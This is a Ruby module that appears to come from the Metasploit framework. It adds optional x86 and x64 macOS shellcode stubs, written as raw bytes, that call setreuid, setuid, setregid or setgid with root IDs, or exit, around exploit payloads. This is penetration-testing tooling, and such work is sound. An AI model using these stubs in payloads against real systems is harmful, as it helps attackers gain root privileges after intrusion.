# -*- coding: binary -*-
require 'msf/core'

###
#
# This class is here to implement advanced features for osx-based
# payloads. OSX payloads are expected to include this module if
# they want to support these features.
#
###
module Msf::Payload::Osx

  #
  # This mixin is chained within payloads that target the OSX platform.
  # It provides special prepends, to support things like chroot and setuid.
  #
  def initialize(info = {})
    ret = super(info)

    register_advanced_options(
      [
        Msf::OptBool.new('PrependSetreuid',
          [
            false,
            "Prepend a stub that executes the setreuid(0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetuid',
          [
            false,
            "Prepend a stub that executes the setuid(0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetregid',
          [
            false,
            "Prepend a stub that executes the setregid(0, 0) system call",
            false
          ]
        ),
        Msf::OptBool.new('PrependSetgid',
          [
            false,
            "Prepend a stub that executes the setgid(0) system call",
            false
          ]
        ),
        Msf::OptBool.new('AppendExit',
          [
            false,
            "Append a stub that executes the exit(0) system call",
            false
          ]
        ),
      ], Msf::Payload::Osx)

    ret
  end

  def apply_prepends(buf)
    test_arch = [ *(self.arch) ]
    pre = ''
    app = ''

    # Handle all x86 code here
    if (test_arch.include?(ARCH_X86))
      handle_x86_osx_opts(pre, app)
    elsif (test_arch.include?(ARCH_X64))
      handle_x64_osx_opts(pre, app)
    end

    pre + buf + app
  end

  def handle_x86_osx_opts(pre, app)

    if (datastore['PrependSetreuid'])
      # setreuid(0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x7e"             + #   movb    $0x7e,%al                  #
             "\xcd\x80"              #   int     $0x80                      #
    end

    if (datastore['PrependSetuid'])
      # setuid(0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x17"             + #   movb    $0x17,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetregid'])
      # setregid(0, 0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x7f"             + #   movb    $0x7f,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['PrependSetgid'])
      # setgid(0)
      pre << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\xb5"             + #   movb    $0xb5,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end

    if (datastore['AppendExit'])
      # exit(0)
      app << "\x31\xc0"             + #   xorl    %eax,%eax                  #
             "\x50"                 + #   pushl   %eax                       #
             "\xb0\x01"             + #   movb    $0x01,%al                  #
             "\xcd\x80"               #   int     $0x80                      #
    end
  end

  def handle_x64_osx_opts(pre, app)

    if (datastore['PrependSetreuid'])
      # setreuid(0, 0)
      pre << "\x41\xb0\x02"         + # mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
             "\x49\xc1\xe0\x18"     + # shl r8, 24
             "\x49\x83\xc8\x7e"     + # or r8, 126  (setreuid=126)
             "\x4c\x89\xc0"         + # mov rax, r8
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetuid'])
      # setuid(0)
      pre << "\x41\xb0\x02"         + # mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
             "\x49\xc1\xe0\x18"     + # shl r8, 24
             "\x49\x83\xc8\x17"     + # or r8, 23  (setuid=23)
             "\x4c\x89\xc0"         + # mov rax, r8
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetregid'])
      # setregid(0, 0)
      pre << "\x41\xb0\x02"         + # mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
             "\x49\xc1\xe0\x18"     + # shl r8, 24
             "\x49\x83\xc8\x7f"     + # or r8, 127  (setregid=127)
             "\x4c\x89\xc0"         + # mov rax, r8
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x48\x31\xf6"         + # xor rsi, rsi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['PrependSetgid'])
      # setgid(0)
      pre << "\x41\xb0\x02"         + # mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
             "\x49\xc1\xe0\x17"     + # shl r8, 23
             "\x49\x83\xc8\x5a"     + # or r8, 90  (setgid=181>>1=90)
             "\x49\xd1\xe0"         + # shl r8, 1
             "\x49\x83\xc8\x01"     + # or r8, 1 (setgid=181&1=1)
             "\x4c\x89\xc0"         + # mov rax, r8
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end

    if (datastore['AppendExit'])
      # exit(0)
      app << "\x41\xb0\x02"         + # mov r8b, 0x2   (Set syscall_class to UNIX=2<<24)
             "\x49\xc1\xe0\x18"     + # shl r8, 24
             "\x49\x83\xc8\x01"     + # or r8, 1  (exit=1)
             "\x4c\x89\xc0"         + # mov rax, r8
             "\x48\x31\xff"         + # xor rdi, rdi  0
             "\x0f\x05"               # syscall
    end
  end


end
